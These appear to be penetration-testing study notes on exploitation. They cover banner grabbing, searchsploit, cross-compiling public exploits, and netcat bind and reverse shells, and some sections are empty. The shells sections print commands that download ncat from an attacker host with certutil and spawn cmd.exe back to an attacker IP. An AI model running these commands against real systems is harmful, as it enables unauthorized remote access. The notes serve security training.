# Table of contents

- [Introduction to Exploitation](#1)
- [Vulnerability Scanning](#2)
  - [Banner grabbing](#2.1)
  - [A deeper look into Nmap NSE Scripts](#2.2)
  - [Vulnerability Scanning with Metasploit](#2.3)
- [Exploitation](#3)
  - [Exploits... and where to find them.](#3.1)
  - [The CLI Tool](#3.2)
  - [Fixing Exploits](#3.3)
- [Shells](#4)
  - [Netcat Fundamentals](#4.1)
  - [Bind Shells](#4.2)
  - [Reverse Shells](#4.3)
  - [Reverse Shell Cheatsheet](#4.4)
- [Frameworks](#5)
  - [Metasploit Framework](#5.1)
  - [Powershell Empire (from BC-SECURITY)](#5.2)
  - [RevShells](#5.3)
  - [RouterSploit](#5.4)

<a id=1></a>
# Introduction to Exploitation

Exploitation consists of techniques and tools used by an adversarie and penetration testers to gain an initial
foothold onto a system. 

Successful exploitaiton will heavily depend on information gathering and enumeration. "We can only exploit a target
if we know what is vulnerable."

We've seen automated attacks using Metasploit and other tools, but we haven't tried to really understand what exploitation
and its methodology is. In this section, we will get a better picture of that :)

We will use the PTES (Penetration Testing Execution Standard). Thus, we will follow the follow attack schema:

1. Information Gathering
2. Enumeration.
3. Exploitation.
4. Post-exploitation.
	4.1 Privilege escalation.
	4.2 Mantaining persistent access.
	4.3 Clearing tracks

The exploitation phase and its methodology consist on the following:

- Identify vulnerable services.
- Identify, find or create exploit code.
- Gain access
	- Automated - via frameworks.
	- Manually.
- Bypass AV detection.
- Pivot.
- Profit!!! :)

<a id=2></a>
# Vulnerability scanning

<a id=2.1></a>
## Banner Grabbing

Banner grabbing is the process of connecting to a service to grab a piece of information called banner. Many services
tend to present themselves to the user, although most of the time this is considered a vulnerability.

If an Apache server tells you its exact version (and sometimes the distro its running on) that's a huge vulnerability that
can (and will) be exploited either by a malicious actor or by a pentester.

The most used banner grabbing technique is via the use of Netcat. Let's try it.

```bash
$ nc -v [TARGET_ADDRESS] [PORT]
# the netcat binary might be different. ncat, nc/GNU, nc/BSD and other version exist, so do be careful.
# some versions of netcat allow us to execute a command when a target establishes a connection with us
# (reverse shell), so the techniques may vary.
$ nmap --script=banner [TARGET] -p [PORT]
# this is another banner grabbing technique :)
# pro tip: you don't have an nmap binary and you dont want to upload it to a machine? fear not!
$ nc -zv [TARGET] [PORT/PORT_RANGE]
# this nc command might be used as a TCP port scanner :)
```

<a id=2.2></a>
## A deeper look into Nmap NSE Scripts

The NSE (Nmap Scripting Engine) is a powerful tool for pentesters, as it allows us to create our own custom
Nmap scripts. The NSE is mainly written in Lua, for which we'll need to learn some of it to build our own scripts.

Nevertheless, let's check the already existing Nmap scripts that come pre-packaged with it.

```bash
$ ls -l /usr/share/nmap/scripts/ | grep [SERVICE]
# a lot of scripts come with nmap, so grep the service you need to check :)
$ vim /usr/share/nmap/scripts/http-shellshock.nse
# try to give the scripts a read. get familiriazed with how they look, how they work, this way
# we'll be able to make our own ones in the future.
```

We don't need to know first hand how every script works. The Nmap documentation is thorough, and most scripts are
well documented. Custom scripts are good too, and if, say, they aren't as well documented as the official ones, you
can still look at the NSE file and check how it works.

<a id=2.3></a>
## Vulnerability Scanning with Metasploit

We've already seen vuln scanning with Metasploit, so I won't cover it here ):

<a id=3></a>
# Exploitation

<a id=3.1></a>
## Exploits... and where to find them.

Sometimes we'll have to search for an exploit - and sometimes we won't find anything, but that's for latter - and
we have to be careful on where we search.

We need to understand that we can't just download and execute scripts from wherever we want, less so if we're doing
a pentest. For that, we need to check the two most important exploit sources:

- [Exploit-DB](https://www.exploit-db.com)
- [Rapid7](https://www.rapid7.com/db/)

Check the Exploit-db. You'll find exploits, submit exploits, access the Google Hacking Database, and more.

You can also check the db from the terminal using the Searchsploit application.

You can also browse Rapid7 EDB. I prefer the Exploit-db, but to each his own :)

Github is also a source to look exploits up, but it can be dangerous. So if you do try to run a Github exploit, be
careful and try to read the code before running it.

<a id=3.2></a>
## The CLI Tool.

Sometimes we might not have access to the internet, and as a result, we must be able to find exploits
locally or somewhere else.

Fear not. For the Exploit-DB comes prepackaged in almost all pentesting distros: Kali, Parrot, Blackarch, the main ones,
they all have it.

To access the Exploit-db, we can use a tool called Searchsploit.

```bash
$ searchsploit -u
# update the db
$ searchsplit [QUERY]
# search stuff
$ searchsploit -m [ID]
# copy a file from the db to the current working directory
$ searchsploit -c [CASE_SENSITIVE_QUERY]
# not very useful, but available :)
$ searchsploit -e [QUERY]
# this is an exact match query.
$ searchsploit [LOCAL/REMOTE] [PLATFORM] [SERVICE]
# "advanced" query. useful to delimit the exploits that can appear :)
```

<a id=3.3></a>
## Fixing Exploits

Download or copy an exploit and read it. Get familiar with it. Check the Rejetto RCE exploit, for example. You will have to
fix some parts to make it work on your own machine.

<a id=3.4></a>
## Cross-compiling exploit binaries

Some times an exploit might be written in C, C++, C# or other, and we might have to compile it to a PE instead of an ELF.
That means that we must know how to compile exploits from Linux to run on Windows. 

That is the process of cross-compilation, and as pentesters we must have to know how to compile this exploits, especially those
written in C and C++.

To Cross-compile a Windows PE, we will need a tool called MingW-w64. Also, it is assumed that your current distro has the GCC
compiler and/or G++ compiler. This are essential for us, as they will allow us to build exploits for any platform we want

Get your copy of Mingw-w64 with `pacman -S mingw-w64`.

I'll use the 9303 exploit for a Windows explaination from the database. Feel free to use whatever you like. I will also use the
40839 exploit for Linux.

```bash
$ i686-w64-mingw32-gcc 9303.c -o pexec # 64 bit binary
$ i686-w64-mingw32-gcc 9303.c -o pexec -lws2_32 # 32 bit binary
# done. wasn't that hard right? sometimes we might have to give flags to the compiler to correctly compile,
# but in most cases the exploit itself will be documented and tell us the flags we might need.
# lets compile a linux binary
$ gcc 40839.c -o dicow
# this WILL fail. Nevertheless, as I said earlier, some exploits will tell you what FLAGS you need to build
# them. and if we check this exploit, it tells us what we need to do.
$ gcc -pthread 40839.c -lcrypt -o dicow # 64 bit binary
$ gcc -pthread 40839.c -lcrypt -m32 dicow # 32 bit binary
# done!
```

<a id=4></a>
# Shells

<a id=4.1></a>
## Netcat Fundamentals

Netcat is what we call a swiss knife of networking tools. It can read and write data to network connections using TCP or UDP.

It's available for both *Nix systems and NT systems. Netcat uses client-server type communications, and it can work as both.

For us pentesters, the Netcat utility servers the following purposes:

- Banner grabbing
- Port scanning
- Transferring files
- Reverse and bind shells

Let's see some useful flags.

| Flag           | Usage                                                                                                                      |
|--------------- | -------------------------------------------------------------------------------------------------------------------------- |
| -z             | Netcat will server the purpose of running through \[port-range\] and say it X-Y ports are open or not.                     |
| -v             | Enable verbosity. Can be used repeteadly.                                                                                  |
| -u             | Start working on UDP instead of TCP.                                                                                       |
| -l             | Start the server mode. Listen to any connection to the given port                                                          |
| -p             | Pick a port to listen on.                                                                                                  |
| -n             | Doesn't enable domain name resolution.                                                                                     |
| -x             | Execute a command on the remote host. This isn't always available and will depend on your Netcat "flavour" (BSD, GNU, etc  |

Let's see some ways in which Netcat can be useful.

```bash
$ nc -z [TARGET] [PORT]/[PORT-RANGE]
# check if PORT/PORT-RANGE is open or not.
$ nc -nlvp [PORT]
$ python -m http.server 80
C:\> certutil.exe -f -urlcache http://ATTACKER/ncat64.exe ncat.exe
C:\> .\ncat.exe [ATTACKER] [PORT] -e cmd.exe
# now we have a second terminal on netcat. if you hide the nc binary, you might as well create persistence
# through netcat.
$ nc -nv [TARGET] [PORT] < [FILE]
C:\> nc -nlvp [PORT] > [FILE]
# this will allow you to send files between systems.
```

<a id=4.2></a>
## Bind Shells

A bind shell is a type of shell where the attacker is the one that connects to the victim machine. Nowadays this is not used that much,
as firewalls rapidly detect this kinds of connections and they just drop them.

Attacker (Netcat client) > Victim (Netcat listener)

One way to create a bind shell is the following:

```bash
$ python -m http.server 80
C:\> certutil -urlcache -f http://[ATTACKER]/nc.exe nc.exe
C:\> nc -nlvp 9999 -e cmd.exe
$ nc [VICTIM_IP] [PORT]
C:\> echo PWNED!!!! :)
```

<a id=4.3></a>
## Reverse Shells

A reverse shell is when the victim connects to the attackers. This is a better approach to remote shells, as they're stealthier
and usually consequently allow remote execution or arbitrary commands. The only downside is that we must provide an IP address to
the victim machine to allow a reverse connection. Although as an indicator of compromise this is almost painless, we will lose
a machine, as our IP will definitely be blocked by a ~~pesky~~ cybersecurity analyst.

Attacker (Netcat listener) < Victim (Netcat client)

Let's see how to create a reverse shell.

```bash
$ nc -nlvp [PORT]
C:\> nc [ATTACKER_IP] [PORT] -e cmd.exe
C:\> shells rock!! # on the Linux machine :)
```

Although this examples are done as if we had access to both systems at the same time, it doesn't have to be that way. Maybe
we found a bug in a webpage that allow for arbitrary commands to be ran. That's perfect attack vector for a reverse shell.

<a id=4.4></a>
## Reverse Shell Cheatsheet

There are a lot of different ways in which we can create shells. So much that it's really hard to remember them all. 
Because of that, we will see some resources where we will find entire lists of different types of reverse shells.

- [PayloadAllTheThings Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Revshells (we'll look at this in-depth later)](https://www.revshells.com/)

<a id=5></a>
# Frameworks

<a id=5.1></a>
## Metasploit Framework

We've already covered the Metasploit Framework in-depth before, but I'll just explain what it is.

The Metasploit Framework is a robust, open source exploitation framework which allow pentesters to automate (or make easier) every
process of the penetration test (as stated by the PTES standard).

It has thousands of modules for many, many tasks, scans, exploits, etcetera. We can even build our own modules (be it exploit, auxiliary, etc)
so it is highly customizable and expansible. 

As pentesters we cannot completely rely on this or others frameworks, as sometimes they won't do the job for us, or they aren't as advanced as
we might need them to be. For example, to create a payload with Msfvenom that will evade antivirus detection is a gigantic task. Other frameworks
exist that will help you to do that, although not all of them -- and sometimes none o them -- will be able to help us on this task.

<a id=5.2></a>
## Powershell Empire (from BC-SECURITY)

[Empire](https://github.com/BC-SECURITY/Empire) is a framework created by the EmpireProject, now maintained by BC-SECURITY, that will allow us to
create C2 servers and even enable "multiplayer" sessions where several red teamers or pentesters can share their sessions with other pentesters.


<a id=5.3></a>
## RevShells

<a id=5.4></a>
## RouterSploit

